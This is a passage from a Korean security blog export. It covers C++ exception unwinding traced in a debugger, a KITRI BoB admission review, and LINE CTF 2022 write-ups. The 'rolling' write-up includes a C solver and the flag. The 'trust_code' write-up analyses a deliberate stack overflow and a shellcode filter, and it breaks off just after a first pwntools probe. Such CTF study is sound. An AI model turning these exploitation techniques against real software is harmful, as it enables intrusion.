_URC_INSTALL_CONTEXT 에 해당하는 7을 반환하며, context-&gt;ra 필드의 값이 0x4012c4 로 바뀌어 있습니다. 이는 func 함수에서 MyClass 의 소멸자를 호출하는 랜딩 패드의 시작 주소입니다. 이와 같이 cleanup 단계에서는 LSDA를 해석하여 랜딩 패드의 주소를 찾아 context-&gt;ra 필드에 대입하여 실행 흐름이 랜딩 패드로 옮겨질 수 있도록 합니다.\nBreakpoint 6, 0x00007f845bf3b2d9 in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1pwndbg&gt; nipwndbg&gt; i r raxrax            0x7                 7pwndbg&gt; x/8i *(uint64_t *)($context+8*19)   0x4012c4 &lt;func()+92&gt;:    endbr64   0x4012c8 &lt;func()+96&gt;:    mov    rbx,rax   0x4012cb &lt;func()+99&gt;:    lea    rax,[rbp-0x19]   0x4012cf &lt;func()+103&gt;:   mov    rdi,rax   0x4012d2 &lt;func()+106&gt;:   call   0x401382 &lt;MyClass::~MyClass()&gt;   0x4012d7 &lt;func()+111&gt;:   mov    rax,rbx   0x4012da &lt;func()+114&gt;:   mov    rdi,rax   0x4012dd &lt;func()+117&gt;:   call   0x401120 &lt;_Unwind_Resume@plt&gt;\ncleanup 단계의 성공으로 반복문을 탈출합니다. 계속 실행하면 uw_install_context 매크로의 내부인 마지막 중단점에서 멈추게 됩니다. 이 매크로는 context 구조체의 내용을 실제 레지스터에 반영하는 코드로 구성되어 있습니다. 매크로의 끝에서 점프를 수행하면 랜딩 패드로 실행 흐름을 옮기면서 MyClass 의 소멸차를 호출하는 코드를 실행합니다.\nBreakpoint 6, 0x00007f845bf3b2d9 in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1pwndbg&gt; emu 3 ► 0x7f845bf3b2d9 &lt;_Unwind_RaiseException+905&gt;    jmp    rcx                           &lt;func()+92&gt;    ↓   0x4012c4       &lt;func()+92&gt;                     endbr64   0x4012c8       &lt;func()+96&gt;                     mov    rbx, rax   0x4012cb       &lt;func()+99&gt;                     lea    rax, [rbp - 0x19]   0x4012cf       &lt;func()+103&gt;                    mov    rdi, rax   0x4012d2       &lt;func()+106&gt;                    call   MyClass::~MyClass()                      &lt;MyClass::~MyClass()&gt;   0x4012d7       &lt;func()+111&gt;                    mov    rax, rbx\n결론\nC++은 예외가 없으면 오버헤드도 발생하지 않는 zero-cost 예외 처리 방식을 사용하고 있습니다. 런타임에 예외가 발생하면 스택 되감기를 수행하면서 바이너리에 미리 준비된 랜딩 패드를 순서대로 방문하는데, 이 과정에서 unwind 라이브러리와 C++ ABI의 도움을 받습니다. 스택을 되감기 위해서는 특정 주소에 대한 이전 프레임을 복원할 수 있어야 합니다. 컴파일러가 바이너리에 이전 프레임을 복원하는 방법을 인코딩하면, unwind 라이브러리가 이를 해석하여 스택을 되감고 C++ ABI의 personality 루틴이 랜딩 패드로 실행 흐름을 옮김을 동적 분석을 통해 확인할 수 있었습니다.\n참고자료\n[1] S. B. Lippman, J. Lajoie and B. E. Moo, “18.1 Exception Handling,” in C++ Primer, 5th ed. Boston, MA: Addison-Wesley, 2012, pp. 772-784.\n[2] DWARF Debugging Information Format, Version 5, DWARF Debugging Information Format Committee, 2012.\n[3] Exception Handling, Itanium C++ ABI, 2012. [Online] Available: https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html\n[4] Exception Handling Tables, HP aC++ A.01.15 - Public version, 2012. [Online] Available: https://itanium-cxx-abi.github.io/cxx-abi/exceptions.pdf\n\n\n","categories":["Security","Reverse Engineering"]},{"title":"KITRI BoB 9기 최종합격 / 서류, 면접 후기 (2)","url":"/2022/06/18/kitri-bob-9-2/","content":"개요\n이전 글에서 이어지는 KITRI BoB 합격 후기입니다. 이번 글에서는 제가 지원한 취약점분석 트랙의 필기, 면접 전형 경험을 공유해보려고 합니다.\n\n필기 전형\n\n올해 처음 도입된 CTF형 필기 전형입니다.\n기존 필기 전형과 유사한 객관식 몇 문제를 제외하면, 실제 파일을 주고 플래그를 찾아 write-up과 함께 업로드해야 합니다.\n\n시스템 해킹, 웹 해킹, 리버싱, 암호학과 알고리즘 문제까지 출제되었습니다.\n\n\n솔직히 말해서 제일 쉬운 한 문제 빼고는 전부 시간 내에 풀지 못했습니다.\n다음날 멘탈을 잡고 나머지 문제를 복기한 결과 이런 결론을 얻었습니다.\n\n생각보다 문제는 어렵지 않았습니다.\n그런데 불친절한 문제는 꽤 많습니다. (e.g. 정적 컴파일된 바이너리)\n\n\nCTF 경험이 많지 않은 초심자 분들은 분석해 볼 만한 문제를 하나 잡고 끝까지 파고드는 전략이 유효할 것 같습니다.\n\n시간이 꽤 촉박하니, 몇 시간씩 걸릴 것 같은 문제는 과감히 포기하는 편이 나을 수도 있습니다.\n\n\n그리고 필기 전형 후에도 풀지 못한 문제를 꼭 다시 살펴봐야 면접 전형에서도 도움이 될 가능성이 높습니다.\n\n일부 멘토님은 고난도 문제의 풀이 방법을 물어보는 경우가 있습니다.\n\n\n\n\n\n면접 전형\n\n면접도 바뀌어, 기존의 학습 계획이나 하고 싶은 프로젝트 발표는 진행하지 않습니다.\n3분 자기소개가 추가되었고, 취약점분석 트랙은 발표자료 없이 구두로 진행합니다.\n\n3분 자기소개를 준비하면서 유튜브 인싸담당자 님의 영상이 많은 도움이 되었습니다.\n기술 면접에 가까운 성격을 고려할 때, 수사법으로 열정을 강조하는 대신 나는 이런 사람이고, 이런 경험을 했고, 이런 걸 느끼고 배웠으며, 앞으로 이런 일을 하고 싶어 지원했다는 내용을 담담히 이야기하는 것이 좋겠습니다.\n저는 내용을 외우고 발표하는 편이 강약을 주거나 감정을 조절할 때 도움이 되었습니다.\n\n\n제가 입장한 면접실은 멘토님 두 분에 지원자 세 명이 입장했습니다.\n저는 대부분 “~를 공부했다고 했는데 ~를 아느냐”, &quot;~에 대해 설명해보아라&quot;와 같은 질문을 받았습니다.\n\nIE 1-day를 공부했다는 내용에서 &quot;IE의 MemGC 보호 기법에 대해 학습했느냐&quot;는 질문을 받았는데, 솔직하게 처음 들어본다고 말씀드렸더니 다음 질문으로 넘어가셨습니다.\n\n\n제가 받은 질문의 경우 대부분 자기소개서와 3분 자기소개에서 겹치는 소재에 대한 내용을 물어보셨습니다.\n따라서 서류나 자기소개에 강조한 내용에 대해서는 예상 질문을 스스로 만들어 보시고 대비하는 것이 좋을 것 같습니다.\n\n합격 이후 마음을 추스리고 정리해 보았는데, 많은 분들께 도움이 되었으면 좋겠습니다. 글 내용과 관련된 질문은 댓글이나 연락 주시면 상세히 답변드리겠습니다. 마지막으로 BoB 지원의 전 과정에서 전폭적으로 도움을 받았던 고려대학교 이희조 교수님과 김영훈 선배, 그리고 응원해주신 모든 분들께 감사드립니다.\n\n\n","categories":["Thoughts"]},{"title":"[LINE CTF 2022] rolling","url":"/2022/08/28/line22-rolling/","content":"개요\n\nwhat you know about rolling?\n\nrolling.apk\n문제 분석\n\n    \n    주의사항\n    이 글의 내용을 따라하기 위해서는 Aarch64 아키텍처 기반의 안드로이드 장치가 필요합니다. \n    \n\n안드로이드 APK 파일 rolling.apk 가 주어집니다. ADB를 이용하여 안드로이드 장치에 설치한 후 실행하면 그림과 같이 EditText 위젯과 버튼이 있는데, 아무 텍스트나 입력하고 버튼을 누르면 앱이 강제종료됩니다.\n\n런처 액티비티인 MainActivity 의 디컴파일 결과를 보면 10행에 checkFlag 메소드, 19행에 deep 네이티브 메소드가 선언되어 있습니다. checkFlag 메소드는 위의 화면에서 버튼을 누르면 호출되는 메소드입니다. 이 메소드는 EditText 위젯에 특정 URL을 입력하면 “Correct! :)” 문자열을 출력하는데, 그렇다고 플래그를 주는 것은 아닙니다.\npackage me.linectf.app;...public class MainActivity extends AppCompatActivity &#123;    static &#123;        System.loadLibrary(&quot;native-lib&quot;);    &#125;    public void checkFlag(View arg6) &#123;        if(((EditText)this.findViewById(0x7F08006D)).getText().toString() == &quot;IINECFT&#123;youtube.com/watch?v=dQw4w9WgXcQ&#125;&quot;) &#123;  // id:editText            Toast.makeText(this, &quot;Correct! :)&quot;, 1).show();            return;        &#125;        Toast.makeText(arg6.getContext(), &quot;Wrong! :(&quot;, 1).show();    &#125;    public native void deep() &#123;    &#125;    @Override  // androidx.appcompat.app.AppCompatActivity    protected void onCreate(Bundle arg2) &#123;        super.onCreate(arg2);        this.setContentView(0x7F0B001C);  // layout:activity_main    &#125;&#125;\nAPK 파일에서 lib/arm64-v8a 경로에는 64비트 Aarch64 라이브러리인 libnative-lib.so 파일이 있습니다. 안드로이드 앱은 JNI(Java Native Interface)를 이용해 Java로 작성된 앱 코드에서 C/C++로 작성된 네이티브 라이브러리를 불러오고 코드를 실행할 수 있습니다. 이 파일은 앱에서 불러오는 네이티브 라이브러리에 해당하는 것입니다. 앞서 MainActivity 에서 System.loadLibrary 를 호출하여 라이브러리를 불러오면 JNI_OnLoad 함수가 호출됩니다. 이 함수를 살펴보면 7행에서 라이브러리의 deep 함수를 앱에서 호출할 수 있는 네이티브 메소드로 등록하고 있습니다.\njint JNI_OnLoad(JavaVM *vm, void *reserved)&#123;  ...  (*vm)-&gt;GetEnv(vm, (void **)&amp;env, 65542LL);  c = (*env)-&gt;FindClass(env, &quot;me/linectf/app/MainActivity&quot;);  (*env)-&gt;GetObjectClass(env, c);  (*env)-&gt;RegisterNatives(env, c, methods, 1LL);// JNINativeMethod methods[] = &#123;                                                //     &quot;deep&quot;, &quot;()V&quot;, reintepret_cast&lt;void*&gt;(deep)                                                // &#125;;  v3 = (*env)-&gt;GetMethodID(env, c, &quot;checkFlag&quot;, &quot;(Landroid/view/View;)V&quot;);  v4 = (*env)-&gt;GetMethodID(env, c, &quot;deep&quot;, &quot;()V&quot;);  v5 = (*env)-&gt;ToReflectedMethod(env, c, v3, 0LL);  v6 = (*env)-&gt;ToReflectedMethod(env, c, v4, 0LL);  v7 = (*env)-&gt;FindClass(env, &quot;java/lang/reflect/Executable&quot;);  v8 = (*env)-&gt;GetFieldID(env, v7, &quot;artMethod&quot;, &quot;J&quot;);  v9 = (unsigned int *)(*env)-&gt;GetLongField(env, v5, v8);  v10 = (unsigned int *)(*env)-&gt;GetLongField(env, v6, v8);  v11 = *v9;  v12 = *v10;  *(_DWORD *)((char *)&amp;qword_58 + v12) = *(_DWORD *)((char *)&amp;qword_58 + v11);  *(_DWORD *)(v12 + 120) = *(_DWORD *)(v11 + 120);  *v9 = v12;  v9[1] = v10[1] | 1;  v9[2] = v10[2];  *((_WORD *)v9 + 9) = *((_WORD *)v10 + 9);  *(_OWORD *)(v9 + 6) = *(_OWORD *)(v10 + 6);  *((_QWORD *)v9 + 5) = *((_QWORD *)v10 + 5);  return 65542;&#125;\n그런데 10행 이후의 코드를 보면 GetMethodID , ToReflectedMethod 등 JNI 함수들을 이용한 추가적인 작업을 하고 있습니다. 여기서 ToReflectedMethod 함수는 안드로이드 NDK 위키를 보면 Java 리플렉션(reflection)과의 상호작용을 위한 함수라고 명시되어 있습니다. 리플렉션은 런타임에 객체의 멤버들에 대한 정보를 조회하고 조작할 수 있는 Java 언어의 기능입니다. 이를 참고할 때, 리플렉션을 이용해 checkFlag 의 artMethod 값을 deep 의 값으로 덮어씌워 런타임에 checkFlag 메소드를 호출하면 deep 네이티브 메소드가 호출되도록 조작하고 있음을 추측할 수 있습니다.\n라이브러리에서 deep 함수를 살펴보면 MainActivity 의 EditText 위젯에 입력된 문자열을 가져와 반복문을 실행합니다. 반복문은 문자열 내의 각 문자 s[i] 에 대해 meatbox , soulbox , godbox 함수를 실행하여 결과가 각각 data[i] , data[i + 1] , data[i + 2] 와 모두 같은지 검사합니다. 모든 문자에 대해 검사를 통과하면 “Correct! :)” 를 출력합니다. 따라서 이를 만족하는 문자열이 플래그라고 짐작할 수 있습니다.\n__int64 __fastcall deep(JNIEnv *env, __int64 a2, __int64 a3)&#123;    ...    if ( (stat(&quot;/bin/su&quot;, (struct stat *)v51) &amp; 0x80000000) != 0      &amp;&amp; (stat(&quot;/bin/magisk&quot;, (struct stat *)v51) &amp; 0x80000000) != 0 )    &#123;      v50 = v19;      v27 = (*env)-&gt;FindClass(env, &quot;me/linectf/app/R$id&quot;);      v28 = (*env)-&gt;GetStaticFieldID(env, v27, &quot;editText&quot;, &quot;I&quot;);      (*env)-&gt;GetStaticIntField(env, v27, v28);      v29 = (*env)-&gt;FindClass(env, &quot;me/linectf/app/MainActivity&quot;);      v30 = (*env)-&gt;GetMethodID(env, v29, &quot;findViewById&quot;, &quot;(I)Landroid/view/View;&quot;);      v31 = _JNIEnv::CallObjectMethod(env, a2, v30);      v32 = (*env)-&gt;FindClass(env, &quot;android/widget/EditText&quot;);      v33 = (*env)-&gt;GetMethodID(env, v32, &quot;getText&quot;, &quot;()Landroid/text/Editable;&quot;);      v34 = _JNIEnv::CallObjectMethod(env, v31, v33);      v35 = (*env)-&gt;FindClass(env, &quot;android/text/Editable&quot;);      v36 = (*env)-&gt;GetMethodID(env, v35, &quot;toString&quot;, &quot;()Ljava/lang/String;&quot;);      v37 = (void *)_JNIEnv::CallObjectMethod(env, v34, v36);      s = (*env)-&gt;GetStringUTFChars(env, v37, 0LL);      j = 0;      i = 0LL;      failed = 0;      while ( strlen(s) &gt; i )      &#123;        sub_3C48(buf, v42, v43, v44, (unsigned __int8)s[i]);// vsnprintf(buf, 2, &quot;%c&#x27;, s[i])        v45 = (unsigned __int8 *)meatbox(buf);        v46 = (unsigned __int8 *)soulbox(buf);        v47 = (unsigned __int8 *)godbox(buf);        if ( data[j] != *v45 || data[j + 1] != *v46 || data[j + 2] != *v47 )          failed = 1;        ++i;        j += 3;      &#125;      if ( failed == 1 || strlen(s) &lt;= 50uLL )      &#123;        v48 = *env;        v49 = &quot;Wrong! :(&quot;;      &#125;      else      &#123;        v48 = *env;        v49 = &quot;Correct! :)&quot;;      &#125;\n문제 풀이\n플래그를 얻기 위해서는 라이브러리에 구현된 meatbox , soulbox , godbox 함수의 인자로 전달했을 때 결과가 data 배열의 값들과 일치하는 문자열을 구해야 합니다. 그런데 이들 함수의 구현은 매우 복잡하여 분석이 쉽지 않습니다. 라이브러리 또한 안드로이드 NDK로 컴파일된 라이브러리로 일반적인 Aarch64 환경에서 동적 분석을 시도하여도 의존성 문제로 인해 로딩조차 되지 않습니다. 따라서 해당 라이브러리를 동적으로 로딩하여 meatbox , soulbox , godbox 함수를 호출하는 C 코드를 작성하고, 안드로이드 NDK로 컴파일한 후 Aarch64 기반의 안드로이드 장치에서 실행하도록 하겠습니다.\n안드로이드 NDK는 C/C++로 작성한 코드를 안드로이드에서 실행 가능하도록 하는 빌드 도구입니다. 안드로이드 통합 개발 환경인 안드로이드 스튜디오(Android Studio)의 SDK Manager 메뉴에서 다음과 같이 설치할 수 있습니다.\n\n안드로이드 NDK 설치 경로의 clang 컴파일러를 이용해 소스 코드를 컴파일하고, ADB를 이용하여 바이너리를 장치에 전송하는 빌드 스크립트를 다음과 같이 작성하였습니다. 설치 경로는 운영체제에 따라 서로 다를 수 있습니다.\n#!/usr/bin/env bash# add to terminal PATH variableexport PATH=&quot;$HOME/Library/Android/sdk/ndk/25.1.8937393/toolchains/llvm/prebuilt/darwin-x86_64/bin:$PATH&quot;# make alias CC to be the new clang binaryexport CC=aarch64-linux-android29-clang$CC main.c -o main# push compiled binary to androidadb push main /data/local/tmp\n라이브러리를 로드할 때 유의할 점은 해당 라이브러리는 C++로 작성되어, 함수 이름이 맹글링(mangling)되어 있다는 것입니다. readelf 를 사용해 라이브러리에서 심볼을 조회하면 meatbox , soulbox , godbox 함수들의 맹글링된 이름을 확인할 수 있습니다. 함수를 불러올 때는 이 이름들을 사용해야 합니다.\n$ readelf -s .\\libnative-lib.so | grep &quot;box&quot;    ...    21: 0000000000001708  1040 FUNC    GLOBAL DEFAULT   10 _Z7meatboxPc    ...    28: 000000000000314c  1044 FUNC    GLOBAL DEFAULT   10 _Z6godboxPc    ...    35: 0000000000002428  1040 FUNC    GLOBAL DEFAULT   10 _Z7soulboxPc\n풀이 코드는 dlopen 과 dlsym 함수를 이용해 동적으로 라이브러리를 불러오고 meatbox , soulbox , godbox 함수를 찾아 함수 포인터에 대입합니다. 이후 모든 출력 가능한 ASCII 범위의 문자에 대해 각각의 함수들을 호출하여 결과를 미리 map 배열에 저장합니다. data 배열의 값들과 결과가 일치하는 문자를 map 배열에서 조회하여 플래그를 구할 수 있도록 하였습니다. 안드로이드 장치에 바이너리를 전송하고 실행하면 플래그를 확인할 수 있습니다.\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;dlfcn.h&gt;char *(*meatbox)(char *);char *(*soulbox)(char *);char *(*godbox)(char *);char data[153] = &#123; 7, 24, 16, 15, 28, 18, 5, 10, 7, 11, 2, 15, 18, 6, 8, 19, 10, 7, 5, 9, 11, 6, 15, 15, 17, 4, 19, 19, 1, 14, 3, 11, 0, 1, 1, 9, 9, 2, 8, 19, 1, 14, 1, 1, 12, 9, 5, 16, 1, 18, 10, 8, 11, 18, 17, 4, 19, 1, 1, 12, 19, 1, 14, 18, 0, 14, 8, 11, 18, 1, 15, 11, 3, 11, 0, 1, 1, 12, 7, 5, 4, 8, 11, 18, 8, 24, 15, 8, 24, 15, 14, 28, 15, 1, 18, 10, 16, 21, 17, 1, 1, 12, 6, 22, 10, 8, 11, 18, 17, 4, 19, 1, 18, 10, 1, 1, 12, 14, 28, 15, 1, 18, 10, 1, 1, 12, 3, 11, 0, 9, 2, 8, 4, 13, 16, 1, 1, 12, 6, 22, 10, 4, 13, 16, 4, 13, 16, 17, 15, 5, 7, 23, 2 &#125;;void setup() &#123;    void *handle;    char *error;    char map[256][3];    handle = dlopen(&quot;./libnative-lib.so&quot;, RTLD_LAZY);    if (!handle) &#123;        printf(&quot;%s\\n&quot;, dlerror());        exit(0);    &#125;    dlerror();    meatbox = (char *(*)(char *)) dlsym(handle, &quot;_Z7meatboxPc&quot;);    error = dlerror();    if (error != NULL) &#123;        printf(&quot;%s\\n&quot;, error);        exit(0);    &#125;    soulbox = (char *(*)(char *)) dlsym(handle, &quot;_Z7soulboxPc&quot;);    error = dlerror();    if (error != NULL) &#123;        printf(&quot;%s\\n&quot;, error);        exit(0);    &#125;    godbox = (char *(*)(char *)) dlsym(handle, &quot;_Z6godboxPc&quot;);    error = dlerror();    if (error != NULL) &#123;        printf(&quot;%s\\n&quot;, error);        exit(0);    &#125;&#125;int main() &#123;    char buf[2] = &#123; &#x27;\\0&#x27; &#125;;    char map[256][3];           // meatbox, soulbox, godbox    char flag[64] = &#123; &#x27;\\0&#x27; &#125;;    setup();    for (int i = 0x20; i &lt; 0x7f; i++) &#123;        buf[0] = (char) i;        map[i][0] = meatbox(buf)[0];        map[i][1] = soulbox(buf)[0];        map[i][2] = godbox(buf)[0];    &#125;    for (int i = 0; i &lt; 51; i++) &#123;        char m = data[i * 3];        char s = data[i * 3 + 1];        char g = data[i * 3 + 2];        int found = 0;        for (int j = 0x20; j &lt; 0x7f; j++) &#123;            if (map[j][0] == m                    &amp;&amp; map[j][1] == s                    &amp;&amp; map[j][2] == g            ) &#123;                flag[i] = (char) j;                found = 1;            &#125;        &#125;        if (!found) &#123;            printf(&quot;fail!\\n&quot;);            exit(0);        &#125;    &#125;    printf(&quot;%s\\n&quot;, flag);    return 0;&#125;\n$ adb shellbeyond1:/ $ cd /data/local/tmpbeyond1:/data/local/tmp $ ./mainLINECTF&#123;watcha_kn0w_ab0ut_r0ll1ng_d0wn_1n_th3_d33p&#125;\n참고자료\n[1] JNI Functions, Java Native Interface Specification, 2019. [Online] Available: https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/jniTOC.html\n\n\n","categories":["Security","CTF"]},{"title":"[LINE CTF 2022] trust_code","url":"/2022/07/30/line22-trust-code/","content":"개요\nchall.zip\n문제 분석\n\n    \n    주의사항\n    이 글의 내용을 이해하기 위해서는 C++ 예외 처리의 내부 구현에 대한 지식이 필요합니다.\n    \n\n64비트 x86_64 바이너리 trust_code 와 Dockerfile 등이 주어집니다. Dockerfile 을 비롯한 컨테이너 관련 파일은 원본 문제에는 없는 파일로, 대회 환경을 구현하기 위해 작성하였습니다. secret_key.txt 는 서버에만 있어야 하는 파일로, 대회 참가자에게 배포되지 않습니다. 바이너리는 심볼이 있고, Canary, NX, PIE 보호 기법이 적용되어 있습니다.\n$ checksec trust_code[*] &#x27;/home/user/study/ctf/line22/trust_code/trust_code&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n바이너리를 실행하면 iv와 code를 입력받으며, 아무 문자열이나 입력했더니 에러 메시지를 출력하고 종료합니다.\n./trust_codeiv&gt; aaaacode&gt; aaaa= Executed =Sorry for the inconvenience, there was a problem while decrypting code.\nmain 함수의 디컴파일 결과를 보면 다음과 같이 단순합니다.\nint __cdecl main()&#123;  launch();  return 0;&#125;\n그런데 디스어셈블 결과를 보면 __cxa_begin_catch , __cxa_end_catch 함수를 호출하는 부분이 있습니다. 이는 예외 처리에서 사용되는 랜딩 패드 중 catch 블록을 나타냅니다. 내부에서는 puts 함수로 앞서 보았던 에러 메시지를 출력하고 있습니다.\n.text:0000000000001860 ; int __cdecl main(int argc, const char **argv, const char **envp); ....text:0000000000001860 ; __unwind &#123; // __gxx_personality_v0.text:0000000000001860                 sub     rsp, 28h.text:0000000000001864                 mov     rax, fs:28h.text:000000000000186D                 mov     [rsp+28h+var_8], rax.text:0000000000001872                 mov     [rsp+28h+var_C], 0.text:000000000000187A ;   try &#123;.text:000000000000187A                 call    _Z6launchv      ; launch(void).text:000000000000187A ;   &#125; // starts at 187A.text:000000000000187F                 jmp     $+5.text:0000000000001884 ; ---------------------------------------------------------------------------.text:0000000000001884.text:0000000000001884 loc_1884:                               ; CODE XREF: main+1F↑j.text:0000000000001884                 jmp     loc_18E0.text:0000000000001889 ; ---------------------------------------------------------------------------.text:0000000000001889 ;   catch(...) // owned by 187A.text:0000000000001889                 mov     rcx, rax.text:000000000000188C                 mov     eax, edx.text:000000000000188E                 mov     [rsp+28h+var_18], rcx.text:0000000000001893                 mov     [rsp+28h+var_1C], eax.text:0000000000001897                 mov     rdi, [rsp+28h+var_18] ; void *.text:000000000000189C                 call    ___cxa_begin_catch.text:00000000000018A1                 mov     cs:loop_cont, 0.text:00000000000018AB ;   try &#123;.text:00000000000018AB                 lea     rdi, s          ; &quot;\\nSorry for the inconvenience, there wa&quot;....text:00000000000018B2                 call    _puts.text:00000000000018B2 ;   &#125; // starts at 18AB.text:00000000000018B7                 jmp     $+5.text:00000000000018BC ; ---------------------------------------------------------------------------.text:00000000000018BC.text:00000000000018BC loc_18BC:                               ; CODE XREF: main+57↑j.text:00000000000018BC                 xor     edi, edi        ; status.text:00000000000018BE                 call    _exit.text:00000000000018C3 ; ---------------------------------------------------------------------------.text:00000000000018C3 ;   cleanup() // owned by 18AB.text:00000000000018C3                 mov     rcx, rax.text:00000000000018C6                 mov     eax, edx.text:00000000000018C8                 mov     [rsp+28h+var_18], rcx.text:00000000000018CD                 mov     [rsp+28h+var_1C], eax.text:00000000000018D1 ;   try &#123;.text:00000000000018D1                 call    ___cxa_end_catch.text:00000000000018D1 ;   &#125; // starts at 18D1\n따라서 main 함수의 소스 코드는 사실 다음과 같아야 합니다.\nint main() &#123;    try &#123;        launch();    &#125; catch (const std::exception&amp; e) &#123;        puts(&quot;Sorry for the inconvenience, there was a problem while decrypting&quot;);    &#125;    return 0;&#125;\nlaunch 함수는 secret_key.txt 파일의 내용을 읽어 배열 buf 에 저장합니다. 이후 buf 의 내용을 전역 배열 secret_key 에 대입한 후 service 함수를 호출합니다. buf 배열의 크기에서 secret_key 의 길이는 16바이트임을 알 수 있습니다.\nvoid launch(void)&#123;  int fd; // [rsp+1Ch] [rbp-2Ch]  char buf[16]; // [rsp+30h] [rbp-18h] BYREF  unsigned __int64 v2; // [rsp+40h] [rbp-8h]  v2 = __readfsqword(0x28u);  *(_OWORD *)buf = 0LL;  alarm(30u);  signal(14, alarm_handler);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  fd = open(&quot;secret_key.txt&quot;, 0);  read(fd, buf, 16uLL);  close(fd);  *(_OWORD *)secret_key = *(_OWORD *)buf;  service();&#125;\nservice 함수는 배열 buf 에 iv를 입력받고, 동일하게 buf 의 내용을 전역 배열 iv 에 대입한 후 loop 함수를 호출합니다. 그런데 입력받는 길이가 배열의 크기보다 큰 32바이트로 스택 버퍼 오버플로우가 발생합니다.\nvoid service(void)&#123;  char buf[16]; // [rsp+10h] [rbp-18h] BYREF  unsigned __int64 v1; // [rsp+20h] [rbp-8h]  v1 = __readfsqword(0x28u);  printf(&quot;iv&gt; &quot;);  read(0, buf, 32uLL);                          // buffer overflow!  *(_OWORD *)iv = *(_OWORD *)buf;  loop();&#125;\nloop 함수는 loop_cont 값이 참이면 run 함수를 반복하여 호출합니다.\nvoid loop(void)&#123;  while ( loop_cont )    run();&#125;\nrun 함수는 read_code 함수를 호출하여 code 포인터를 반환받습니다. 이후 &amp;code[16] 부터 32바이트를 sc.code 로 복사하고 execute 함수를 호출합니다. sc 는 Shellcode 타입의 객체로, 32바이트 크기의 배열인 code 를 유일한 필드로 가지고 있습니다.\nunsigned __int64 run(void)&#123;  __int128 v0; // xmm0  char *code; // [rsp+18h] [rbp-30h]  Shellcode sc; // [rsp+20h] [rbp-28h] BYREF  unsigned __int64 v4; // [rsp+40h] [rbp-8h]  v4 = __readfsqword(0x28u);  code = read_code();  v0 = *((_OWORD *)code + 1);  *(_OWORD *)&amp;sc.code[16] = *((_OWORD *)code + 2);  *(_OWORD *)sc.code = v0;  execute((unsigned __int8 *)&amp;sc);  Shellcode::~Shellcode(&amp;sc);  return __readfsqword(0x28u);&#125;\nread_code 함수는 48바이트의 code를 배열 buf 에 입력받습니다. 이후 buf 를 인자로 하여 decrypt 함수를 호출하고 포인터를 반환받아 반환합니다.\nchar *read_code(void)&#123;  char buf[48]; // [rsp+20h] [rbp-38h] BYREF  unsigned __int64 v2; // [rsp+50h] [rbp-8h]  v2 = __readfsqword(0x28u);  printf(&quot;code&gt; &quot;);  memset(buf, 0, sizeof(buf));  read(0, buf, 48uLL);  return decrypt((unsigned __int8 *)buf);&#125;\ndecrypt 함수는 인자로 주어진 문자열을 key 와 iv 를 이용해 AES-CBC로 복호화합니다. 인자는 read_code 에서 입력받는 code이므로, 애초에 code는 암호문임을 알 수 있습니다. 복호화된 평문은 out 에 저장되는데, out 의 상위 16바이트가 &quot;TRUST_CODE_ONLY!&quot; 가 아니면 예외를 발생시키고 있습니다.\nchar *__fastcall decrypt(char *in)&#123;  std::exception *exception; // [rsp+8h] [rbp-120h]  char *out; // [rsp+18h] [rbp-110h]  char key[248]; // [rsp+28h] [rbp-100h] BYREF  unsigned __int64 v5; // [rsp+120h] [rbp-8h]  v5 = __readfsqword(0x28u);  out = (char *)operator new[](48uLL);  AES_set_decrypt_key((__int64)&amp;secret_key, 128LL, (int *)key);  AES_cbc_encrypt((__int64)in, (__int64)out, 48LL, (__int64)key, (__int64)iv, 0);  if ( strncmp(out, &quot;TRUST_CODE_ONLY!&quot;, 16uLL) )  &#123;    exception = (std::exception *)__cxa_allocate_exception(8uLL);    std::exception::exception(exception);    __cxa_throw(      exception,      (struct type_info *)&amp;`typeinfo for&#x27;std::exception,      (void (__fastcall *)(void *))&amp;std::exception::~exception);  &#125;  return out;&#125;\ndecrypt 가 반환하는 out 은 그대로 read_code 의 반환값이 되어, run 함수에서 상위 16바이트를 제외한 나머지가 sc.code 로 복사됩니다. 이후 호출되는 execute 함수는 rwx 권한의 페이지를 할당하여 sc.code 의 내용을 복사하고 실행합니다. 이 때 invalid_check 함수에서 sc.code 를 필터링하는데, \\x0f 또는 \\x05 가 존재하지 않을 때만 실행을 허용합니다.\nvoid __fastcall execute(unsigned __int8 *a1)&#123;  void (*addr)(void); // [rsp+8h] [rbp-20h]  char buf[8]; // [rsp+18h] [rbp-10h] BYREF  unsigned __int64 v3; // [rsp+20h] [rbp-8h]  v3 = __readfsqword(0x28u);  if ( (unsigned int)invalid_check(a1) != -1 )  &#123;    addr = (void (*)(void))create_rwx(a1);    addr();    munmap(addr, 0x1000uLL);  &#125;  printf(&quot;done?&gt; &quot;);  read(0, buf, 2uLL);  if ( buf[0] == &#x27;y&#x27; || buf[0] == &#x27;Y&#x27; )    loop_cont = 0;&#125;\n이상의 내용을 정리하면 프로그램은 다음과 같이 동작합니다.\n\niv 와 AES-CBC로 암호화된 code를 입력받아 평문으로 복호화합니다.\n평문의 상위 16바이트가 &quot;TRUST_CODE_ONLY!&quot; 가 아닌 경우 예외를 발생시킵니다.\n평문에 \\x0f 또는 \\x05 가 존재하지 않은 경우에만 rwx 페이지로 복사하여 실행합니다.\n\n문제 풀이\n셸을 획득하기 위해서는 상위 16바이트를 &quot;TRUST_CODE_ONLY!&quot;, 나머지를 셸코드로 채운 문자열을 AES-CBC로 암호화하여 code로 입력해야 합니다. 프로그램에서 복호화 과정에 특별한 취약점이 없고 iv 는 직접 입력할 수 있습니다. 따라서 서버에서 사용하는 key 값을 유출하여 올바른 암호문을 생성해야 합니다.\n그런데 프로그램을 테스트하기 위해 iv 에 16개의 a, code 에 48개의 a를 입력하면 다음과 같이 명시적으로 호출하지도 않은 출력 루틴이 동작하는 것을 확인할 수 있습니다.\n#!/usr/bin/python3from pwn import *r = process(&quot;./trust_code&quot;)# context.log_level = &quot;debug&quot;def main():    r.sendafter(b&quot;iv&gt;&quot;, b&quot;a&quot; * 16)    r.sendafter(b&quot;code&gt;&quot;, b&quot;a&quot; * 48)    r.interactive()if __name__ == &quot;__main__&quot;:    main()\n$ 